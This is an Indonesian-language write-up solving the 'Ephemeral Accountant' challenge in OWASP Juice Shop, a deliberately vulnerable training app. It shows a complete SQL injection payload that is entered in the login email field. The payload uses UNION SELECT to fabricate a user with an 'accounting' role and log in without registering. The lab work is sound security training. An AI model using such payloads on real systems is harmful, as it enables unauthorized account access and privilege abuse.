# Ephemeral Accountant

🔗 **Resource Link:** [Juice Shop - Injection Challenges](https://juice-shop.herokuapp.com/#/score-board?categories=Injection&showDisabledChallenges=false)

---

## Langkah Penyelesaian

1. **Menganalisis Struktur Database Users**  
   Pertama, dilakukan pengecekan untuk memahami bagaimana tabel **users** tersimpan dalam database.  

   <img width="1500" alt="analyze-users" src="https://github.com/user-attachments/assets/5ebb5a46-dcd8-4e20-a839-bef21adcad80">

---

2. **Membuat dan Menyisipkan Akun Baru dengan Payload**  
   Selanjutnya, disusun payload SQL Injection berikut untuk membuat akun baru secara langsung di database:  

' UNION SELECT * FROM (
SELECT 20 AS id,
'acc0unt4nt@juice-sh.op
' AS username,
'acc0unt4nt@juice-sh.op
' AS email,
'test1234' AS password,
'accounting' AS role,
'123' AS deluxeToken,
'1.2.3.4' AS lastLoginIp,
'/assets/public/images/uploads/default.svg' AS profileImage,
'' AS totpSecret,
1 AS isActive,
12983283 AS createdAt,
133424 AS updatedAt,
NULL AS deletedAt
) AS tmp WHERE '1'='1';--


Payload ini digunakan pada kolom *email* saat login.  
Hasilnya, akun **acc0unt4nt@juice-sh.op** berhasil ditambahkan dan dapat digunakan untuk login tanpa perlu registrasi.  

<img width="1500" alt="payload-login" src="https://github.com/user-attachments/assets/fa2e797c-5d45-44f0-80b1-fc8cb4af7a53">

<!-- <img width="1500" alt="account-created" src="https://github.com/user-attachments/assets/3449aef9-5ccc-448f-b290-8a04bb817286">

<img width="1500" alt="challenge-solved" src="https://github.com/user-attachments/assets/da04c3e2-c3cc-45c9-92a7-c390d22ea5b6"> -->

---

## Kesimpulan
- Struktur tabel **users** dapat diakses dan dianalisis menggunakan SQL Injection.  
- Payload UNION SELECT dimanfaatkan untuk membuat akun baru secara langsung dalam database.  
- Login berhasil dilakukan menggunakan akun buatan tanpa melalui proses registrasi.  
- Challenge *Ephemeral Accountant* pun terselesaikan.  
